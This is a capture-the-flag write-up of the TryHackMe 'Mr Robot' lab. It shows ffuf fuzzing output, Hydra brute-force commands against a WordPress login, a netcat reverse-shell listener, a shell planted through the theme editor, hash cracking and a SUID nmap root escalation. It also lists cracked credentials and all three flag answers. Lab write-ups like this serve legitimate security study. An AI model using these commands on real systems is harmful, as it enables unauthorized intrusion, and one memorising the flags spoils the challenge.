---
creation date: November 13th 2022
last modified date: November 13th 2022
aliases: []
tags: #🎌
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[WordPress]] - [[Interactive Shell]] - [[Non-Interactive Shell]]
Search Tag: #🎌  

# [[THM - Mr Robot]]  


# Resolution summary
- Three keys located.
- Need to work on upgrading shells and WordPress vulnerabilities. 

## Improved skills
- Upgrading to interactive shell
- Dictionary attack on webpage

## Used tools
- [[Nmap]]
- [[ffuf]]
- [[Hydra]]
- [[03 - Content/Python]]

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Scanned Quick TCP ports:
```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

Enumerated top 200 UDP ports:
```bash

```

Fuzzing http://{TARGET IP}/FUZZ
```bash
[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1679ms]
| RES | 8514d7e4b53326f457fd10ce2cadd4fa
    * FUZZ: sitemap
    * Found Nothing

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 7721ms]
| RES | fdf409754f4efe7123566b5d948ffcc5
    * FUZZ: rss
    * Found Nothing

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5760ms]
| RES | c111c7c908427a77c0ed3b74f043d79c
    * FUZZ: login

[Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 198ms]
| RES | b19b784d960490dbb775ca774d1e1bd4
    * FUZZ: video

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 801ms]
| RES | 19bb08ece5cfe8d3cc6c0e4fbfd7393f
    * FUZZ: 0

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 822ms]
| RES | 043557b1b41fd31cca71c5b9550519f7
    * FUZZ: feed

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 781ms]
| RES | ac7d51978b665346fc6840d7c6c989db
    * FUZZ: image

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 826ms]
| RES | 185d36404cecccfac27a0126f38ca136
    * FUZZ: atom

[Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 201ms]
| RES | fb37d42197c8ee3ee5c0c74bfd9a3ba7
    * FUZZ: wp-content

[Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 197ms]
| RES | a32604e34e2973951b633d2fd30a0f2b
    * FUZZ: admin

[Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 199ms]
| RES | 681d10d7b10088cb4deab90a02f6a245
    * FUZZ: audio

[Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 199ms]
| RES | c6e31b1e9ed3372de575835739049858
    * FUZZ: intro

[Status: 200, Size: 2599, Words: 115, Lines: 53, Duration: 843ms]
| RES | 345ca825d51074be92e52a266470f15e
    * FUZZ: wp-login

[Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 202ms]
| RES | aaa6bb48cdbab2607b0630f016ccdad4
    * FUZZ: css

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 800ms]
| RES | bd5b4f2514becc35b873aabb3fddaa17
    * FUZZ: rss2

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 256ms]
| RES | cdf33a13f18321d4c04d96cd6ba5528e
    * FUZZ: license

[Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 202ms]
| RES | 9ca9226179afd0b70cbcb8c2e1756570
    * FUZZ: wp-includes

[Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 199ms]
| RES | 6a2a16a93d6467477ec7b1ce836b166a
    * FUZZ: js
    * Found:
	    * Forbidden
		    * You dont have permission to access /js/

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 781ms]
| RES | 151b15742d75e668a34d97d172c93f90
    * FUZZ: Image

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 201ms]
| RES | f8301c428b5f0408d5f4ebcf5b6b2bd6
    * FUZZ: readme
    * Found:
	    * I like where you head is at. However I'm not going to help you.

[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 636ms]
| RES | 74f488ff9d58f202b9abe12577f9b0c9
    * FUZZ: robots
    * Found:
	    * User-agent: *
		* fsocity.dic
		* key-1-of-3.txt

```

---

# Enumeration
## Port 80 - HTTP (Apache)
Found the first key under `/key-1-of-3.txt` and we found this directory by looking in `/robots.txt`.

We also found a dictionary of `fsocity.dic` and downloaded that onto our machine. The next find was from our ffuf scans we located a directory of `/wb-login` which takes us to a log in page.


---

# Exploitation
## Dictionary Attack on /wb-login
1. To start we found a dictionary in our enumeration stage with over 85000 lines. We will use this for both the Username and Password on this login page
2. First up is trying to figure out the Username. When we test signing into the account we can see that it gives us a message **Error Invalid Username**
	1. `hydra -l Elliot -p fsocity.dic -f 10.10.43.41 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PWD^:Invalid'`
	2. We will use **Hydra** in order to brute force the username. We are telling it to ignore `Invalid` and mark the ones that come back without that.
	3. We found `Elliot` in a few seconds
3. Next up we are going after the password of the user we found in the last step.
	1. Testing the username on the form ourselves with a fake password we get a new message **Error The password you entered for the username Elliot**
	2. `hydra -l Elliot -P fsocity.dic -f 10.10.43.41 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username' -t 30`
	3. We will filter out all that contain the `The password you entered for the username`
	4. After a while we get the password of `ER28-0652`
4. Log in creds **Elliot:ER28-0652**
5. Signing in and we find the site is running WordPress 4.3.1
6. The account we are using has access to Appearance > Editor
	1. This allows us to change any page with PHP code so we can get a Reverse Shell
7. Started a listener with `rlwrap nc -lvnp 4444` 
8. We changed archives.php to have a Reverse Shell and navigated to it at `http://10.10.43.41/wp-content/themes/twentyfifteen/archive.php`
9. Shell opened


---

# Lateral Movement to user
## Local Enumeration
Starting as a Daemon and poking around files I found the second flag in `/home/robot/key-2-of-3.txt` but we can not open it yet. Also located in same directory was `password.raw-md5`.
Password file contained **robot:c3fcd3d76192e4007dfb496cca67e13b** putting that into a cracker and got **robot:abcdefghijklmnopqrstuvwxyz**

## Lateral Movement vector
Our current shell was non-interactive meaning commands such as `su` wont work. We need to first make are shell interactive we can do so with python using `python -c 'import pty;pty.spawn("/bin/bash")'`. This command first we put -c which tells python to pass in as a string. Next we import pty which is a module that defines operations for handling the pseudo-terminal concept: starting another process. Then we use "pty.spawn" to start a shell using bash.

Once that is all done we now have an interactive shell. This shell allows us to change to the user robot using the password we found in the enumeration.

---

# Privilege Escalation
## Local Enumeration
Checked for files with the SUID tag on them once found noticed that `nmap` was one of the commands with the SUID tag.

## Privilege Escalation vector
Checking GTFObin found that `nmap` can be used to spawn a shell using `nmap --interactive` > `!sh`. This will enter us into the interactive mode to talk directly to nmap then spawn a shell from that since nmap has the SUID tag this shell runs as root thus giving us root access.

Once root checking root directory we found are third and final key.

---

# Trophy & Loot
key-1-of-3.txt = 073403c8a58a1f80d943455fb30724b9
key-2-of-3.txt = 822c73956184f694993bede3eb39f959
key-3-of-3.txt = 04787ddef27c3dee1ee161b21670b4e4
___

## Resources:

| Hyperlink                                 | Info |
| ----------------------------------------- | ---- |
| [THM](https://tryhackme.com/room/mrrobot) | CTF  | 


Created Date: November 13th 2022 (03:23 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
